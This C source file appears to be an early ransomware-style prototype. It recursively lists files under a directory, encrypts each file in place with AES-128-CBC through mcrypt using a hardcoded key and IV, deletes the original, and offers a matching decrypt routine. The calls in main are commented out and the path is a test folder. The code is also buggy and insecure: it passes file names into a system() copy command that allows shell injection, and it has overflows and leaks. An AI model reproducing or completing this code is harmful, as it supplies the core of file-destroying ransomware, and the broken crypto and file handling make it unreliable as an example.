#include <dirent.h>
#include <stdio.h>
#include <errno.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <mcrypt.h>

char** list_all_files;
int count_files = 0;
char* IV = "AAAAAAAAAAAAAAAA";
char* key = "0123456789abcdef";
int keysize = 16; /* 128 bits */


void list_files(char * path){
    DIR *d = opendir(path);
    struct dirent *dir;
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            //Condition to check regular file.
            if(dir->d_type==DT_REG){
                list_all_files[count_files] = (char*)malloc(1000);
                sprintf(list_all_files[count_files++],"%s/%s",path, dir->d_name);
            }
            else if (dir -> d_type == DT_DIR && strcmp(dir->d_name,".")!=0 && strcmp(dir->d_name,"..")!=0 ){
                char d_path[255];
                sprintf(d_path, "%s/%s", path, dir->d_name);
                list_files(d_path);
            }
        }
        closedir(d);
    }
}

char* encrypt(char* plaintext){
    char* buffer;
    buffer = calloc(1, 80);
    strncpy(buffer, plaintext, 80);
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    //if( buffer_len % blocksize != 0 ){return 1;}

    mcrypt_generic_init(td, key, 16, IV);
    mcrypt_generic(td, buffer, 80);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);

    return buffer;
}

char* decrypt(char* cipher){
    char* buffer;
    buffer = calloc(1, 80);
    strncpy(buffer, cipher, 80);
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    //if( buffer_len % blocksize != 0 ){return 1;}

    mcrypt_generic_init(td, key, 16, IV);
    mdecrypt_generic(td, buffer, 80);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);

    return buffer;
}

char * find_directory_of_file(char * path){
    char * tmp = (char*)malloc(sizeof(char*)*1000);
    tmp = strrchr(path, '/');
    path[strlen(path) - strlen(tmp) + 1] = '\0';
    return path;
}

void encrypt_file(char * path){
    FILE *fp = fopen(path, "rb");
    FILE *fp_temp = fopen("temp.tmp", "wb");

    if (fp == NULL || fp_temp == NULL)
    {
        /* Unable to open file hence exit */
        printf("\nUnable to open file.\n");
        printf("Please check whether file exists and you have read/write privilege.\n");
        exit(EXIT_SUCCESS);
    }
    fseek(fp, SEEK_SET, 0);
    char* plaintext = calloc(1, 80);

    while ((fread(plaintext, 1, 76,fp)))
    {
        if (strcmp(plaintext, "\n") != 0 && !feof(fp)){
            printf("Plaintext: %s | %d\n\n", plaintext, strlen(plaintext));
            // Replace all occurrence of word from current line
            printf("Encrypt: %s | %d\n\n", encrypt(plaintext),strlen(encrypt(plaintext)));

            // After replacing write it to temp file.
            fwrite(encrypt(plaintext), 1, 80, fp_temp);
            fflush(fp_temp);
        }
        else {
            char * tmp = calloc(1, 80);
            tmp = strrchr(plaintext, '\n');
            plaintext[strlen(plaintext) - strlen(tmp) + 1] = '\0';
            printf("Plaintext: %s | %d\n\n", plaintext, strlen(plaintext));
            // Replace all occurrence of word from current line
            printf("Encrypt: %s | %d\n\n", encrypt(plaintext),strlen(encrypt(plaintext)));

            // After replacing write it to temp file.
            fwrite(encrypt(plaintext), 1, 80, fp_temp);
            fflush(fp_temp);
        }
    }
    free(plaintext);
    fclose(fp);
    fclose(fp_temp);

    /* Delete original source file */
    remove(path);

    /* Rename temp file as original file */
    char * cmd = (char*) malloc(sizeof(char*)*1000);
    sprintf(cmd,"cp %s %s", "temp.tmp", path);
    system(cmd);
    free(cmd);
    remove("temp.tmp");
}

void decrypt_file(char * path){
    FILE *fp = fopen(path, "rb");
    FILE *fp_temp = fopen("temp.tmp", "wb");

    if (fp == NULL || fp_temp == NULL)
    {
        /* Unable to open file hence exit */
        printf("\nUnable to open file.\n");
        printf("Please check whether file exists and you have read/write privilege.\n");
        exit(EXIT_SUCCESS);
    }
    fseek(fp, SEEK_SET, 0);
    char* cipher = calloc(1, 80);

    while ((fread(cipher, 1, 80,fp)))
    {
        //printf("Cipher: %s | %d\n\n", cipher, strlen(cipher));
        // Replace all occurrence of word from current line
        //printf("Decrypt: %s | %d\n\n", decrypt(cipher), strlen(decrypt(cipher)));
        // After replacing write it to temp file.
        fwrite(decrypt(cipher), 1,strlen(decrypt(cipher)), fp_temp);
        fflush(fp_temp);
    }
    free(cipher);
    fclose(fp);
    fclose(fp_temp);

    /* Delete original source file */
    remove(path);

    /* Rename temp file as original file */
    char * cmd = (char*) malloc(sizeof(char*)*1000);
    sprintf(cmd,"cp %s %s", "temp.tmp", path);
    system(cmd);
    free(cmd);
}


int main()
{
    list_all_files = malloc(1000*sizeof(char*));

    char path[1000]="/home/doanhnn/linux/test";
    list_files(path);
    for(int i =0; i< count_files; i++){
        printf("%s\n", list_all_files[i]);
        //encrypt_file(list_all_files[i]);
        //decrypt_file(list_all_files[i]);
    }
    //encrypt_file("/home/doanhnn/linux/test/test.c");
    //decrypt_file("/home/doanhnn/linux/test/test.c");
    //MCRYPT td, td2;
    //decrypt(buffer1, 16, IV, key, keysize);
    //printf("decrypt: %s\n", buffer1);
    char* plaintext = "giR6fPtD6QefgMmpmMTB42+/lH4KGTj5AO7kXxFgApjsx8R/\/O0nOgROdnLSde8+q4j3v76XMgE0";
    char* buffer;
    int buffer_len = 80;
    
    buffer = calloc(1, buffer_len);
    strncpy(buffer, plaintext, buffer_len);
    printf("%d\n", strlen(plaintext));
    printf("%d\n", strlen(buffer));
    printf("==C==\n");
    printf("plain:   %s\n", buffer);
    //encrypt(buffer, buffer_len, IV, key, keysize); 
    printf("cipher:  %s\n", encrypt(buffer));
    printf("%d\n", strlen(encrypt(buffer)));

    //decrypt(buffer, buffer_len, IV, key, keysize);
    printf("decrypt: %s\n", decrypt(buffer));
    return(0);
}
